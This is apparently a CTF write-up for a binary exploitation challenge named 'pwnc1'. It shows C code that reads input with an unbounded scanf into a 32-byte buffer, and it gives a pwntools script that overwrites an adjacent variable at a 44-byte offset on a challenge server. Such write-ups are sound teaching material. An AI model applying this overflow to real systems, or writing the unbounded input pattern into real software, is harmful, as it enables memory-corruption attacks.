---
description: Binary Exploitation
---

# pwnc1

> A vulnerable program could you lead to the flag.
>
> By: @4nimanegra

{% file src="../../.gitbook/assets/pwn" %}

{% file src="../../.gitbook/assets/pwn.c" %}

```
Arch:     amd64
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
```

A simple variable overwrite challenge, source code being given definitely makes this way easier.

```c
void pwnme(){

	int number;
	char name[32];

	number=0;

	printf("Insert your name: ");

	scanf("%s",name);

	printf("Welcome home %s\n",name);

	if(number == 8){

		print_flag();

	}

	exit(0);

}
```

Find the offset using gdb until the if statement happens:

<figure><img src="../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

Offset was 44 bytes which allowed me to easily create an overwrite:

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# -*- template: winterbitia -*-

# ====================
# -- PWNTOOLS SETUP --
# ====================

from pwn import *

exe = context.binary = ELF(args.EXE or 'pwn')
trm = context.terminal = ['tmux', 'splitw', '-h']

host = args.HOST or '130.206.158.146'
port = int(args.PORT or 42011)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# =======================
# -- EXPLOIT GOES HERE --
# =======================

io = start()

offset = 44
target_value = 0x8

payload = flat({
    offset: target_value
})

io.clean()
io.sendline(payload)
log.info(io.recvline())

io.interactive()
```

<figure><img src="../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>
